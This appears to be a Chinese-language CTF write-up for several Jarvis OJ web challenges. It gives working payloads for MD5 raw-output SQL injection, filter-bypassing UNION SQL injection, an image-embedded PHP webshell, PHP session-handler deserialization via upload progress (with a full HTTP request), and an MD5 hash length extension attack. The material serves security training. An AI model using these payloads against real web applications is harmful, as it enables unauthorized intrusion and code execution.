##PORT51
key: curl
指定连接的端口为51
curl --local-host 51 url

##Localhost
xff: 127.0.0.1

##Login
Key:md5函数加密后的注入
随便输个密码查看响应头：
Hint:"select * from `admin` where password='".md5($pass,true)."'"
md5函数第二个参数是返回的值得显示方式，false是16进制字符串显示，true的话用16字节的正常二进制字符串显示
所以只要构造一个加密后为276f72....的就行了，对应的二进制字符'or.....
这里记一个：ffifdyop

##神盾局的秘密
查看源码，是一个base64加密的字符串，解密后看到是一个图片的地址，换成index.php，存在文件包含漏洞，再看shiled.php, 然后按要求构造一个类调用readfile()，读取pctf.php即可

##Simple Injection
Key:/**/代替空格
登录框，username存在盲注点。waf会过滤空格，换成/**/即可

##Easy Gallery
Key: 包含上传文件 script标签代替<??>
直接上传图片马上去，在index.php?page=存在包含漏洞，可以00截断，包含上传后的图片（地址可以在view.php找到），一句话用<script language='php'>echo 1;</script>代替<?php ?>,<??>被过滤了。

##PHPINFO
Key: Session序列化handler不同导致对象注入 Session upload progress可以作为session的输入
 打开网页：
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
分析可知如果可以控制mdzz参数就可以任意执行代码。
ini_set('session.serialize_handler', 'php');

PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：
处理器对应的存储格式php键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值php_binary键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值php_serialize 
 (php>=5.5.4)经过 serialize() 函数反序列处理的数组
在这里可以看到session序列化的handler被换成了php，意思就是只要传递正确的seriliaze字符串给session，session就会以php解析，也就是反序列化。但是现在的问题就是怎么传递session给服务器。在这里需要用到的就是session上传进度。
当 session.upload_progress.enabled INI 选项开启时(phpinfo() 中可以查看，这是一个很方便的开关，如果打开了，那么不同处理器漏洞就可以在开关打开的页面随意使用（知道 session.upload_progress.name）)，在一个上传处理中，在表单中添加一个与INI中设置的 session.upload_progress.name 
(在phpinfo()中可以查看，如果能够控制服务器端代码，不过这是废话，都能控制代码了，还有啥不能做的。。。。
<input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />这样写个表单也可以) 同名变量时，$_SESSION中就会添加一个保存上传信息的session值，它的session名是 INI 中定义的 session.upload_progress.prefix 加表单中的post的 session.upload_progress.name, 所以直接post
POST /?phpinfo HTTP/1.1
Host: web.jarvisoj.com:32784
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=bcas4dphcuust3dfuk8hqr6366
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------312061946619381
Content-Length: 465

-----------------------------312061946619381
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

123|O:5:"OowoO":1:{s:4:"mdzz";s:58:"highlight_file('Here_1s_7he_fl4g_buT_You_Cannot_see.php');";}
-----------------------------312061946619381
Content-Disposition: form-data; name="123"; filename="123.txt";
Content-Type: application/pdf

|O:5:"OowoO":1:{s:4:"mdzz";s:17:"echo 'firsttest';";}	


-----------------------------312061946619381--

这里要注意一下，system函数用不起了。先echo scandir(dirname(__FILE__)),再highlight_file即可
session upload progress的参数好像只能在第一个，在内容中加了一个|，这样上传上去后，因为在php.ini中设置的handler是php_seriliaze（通过phpinfo可以查看）, 所以会被储存成
a:1:{s:??:"PHP_SESSION_UPLOAD_PROGRESS";s:20:"|O:......;} 这样然后换成php处理器之后，把 | 前全部当成键名，后面反序列化成对象，成功创建一个实例，mdzz参数可控，可以执行任意代码。。


##In A Mess
Key: 双写绕过sql，/*1*/注释加内容绕过过滤
打开直接右键看源码，有一个index.phps，查看发现是index.php的源码
if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}
id参数需要==0，注意是==而不是===，==只要求数值相同即可，直接id='0'(0a)就行
a不能有.,所以在这里不能直接读文件。访问了下flag.txt是404，估计这里用a也读不出来什么鬼也没啥用。。
然后data是a文件读出来的内容，因为不知道服务器上的文件分布，所以这里多半不是要读一个文件，多半是利用url或者php伪协议，在这我用php://input，然后post '1112 is a nice lab!'(也可以直接读vps上的文件，ip用数字表示即可。) 
eregi函数遇到%00停止，可以让b=%0044444444,不过我是用.44444, 直接利用正则匹配就行了。
绕过后给了一个 
﻿Come ON!!! {/^HT2mCpcvOLf}， 看到有个/，估计就是目录，直接访问

进去后的页面index.php?id=1, 把id换一下，出来了查询语句, 多半是注入
试了一下select,union,from被过滤，/**/，空格被过滤，引号也过滤了
双写绕过关键词过滤，注释加上内容/*1*/,引号被过滤了，用16进制字符串绕过
payload:
?id=0/*1*/ununionion/*1*/seselectlect/*1*/1,2,table_name/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_name=0x??????/*1*/limit/**/0,1#
?id=0/*1*/ununionion/*1*/seselectlect/*1*/1,2,context/*1*/frofromm/*1*/content#


##flag在管理员手里
Key：hash长度拓展攻击
这题一开始要找源码。。我没找到。直接百度发现时pctf的原题可以得到源码。不过也看到wp了。这里还是写一下自己的wp记录一下
源码如下：
<body>
    <?php
        $auth = false;
        $role = "guest";
        $salt =
        if (isset($_COOKIE["role"])) {
            $role = unserialize($_COOKIE["role"]);
            $hsh = $_COOKIE["hsh"];
            if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
                $auth = true;
            } else {
                $auth = false;
            }
        } else {
            $s = serialize($role);
            setcookie('role',$s);
            $hsh = md5($salt.strrev($s));
            setcookie('hsh',$hsh);
        }
        if ($auth) {
            echo "<h3>Welcome Admin. Your flag is
        } else {
            echo "<h3>Only Admin can see the flag!!</h3>";
        }
    ?>

可以看到最关键的是
 if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
     $auth = true;
  }
一开始得到的是  secret+;"tseug":5:s 的MD5值，那么可以算出 
secret + ;"tseug":5:s + padding + ;"nimda":5:s 的值，具体怎么算参考hash长度拓展攻击（这里这个字符串的reverse还是很重要的，有了reverse才可能解析出admin这个role，没有的话，append_str=admin但是解析的role还是guest）
所以只要让cookie['role']=s:5:"admin";+reverse(padding) + s:5:"guest";就可以了，这里要注意的是，php serialize函数只会从第一个字符开始识别序列化，在第一个序列化正常执行完后，后面的字符都被忽略了，所以这里序列化出来的role就是admin, 然后mac的认证因为已经算出来了值，直接放在hsh这个cookie里面就行了，这样两个认证都过了，得到flag
(hashpump弄了一会弄不起。。害得我只有自己去找了个MD5的实现自己写。。。获得新MD5的脚本。。。附上脚本免得掉了。。）





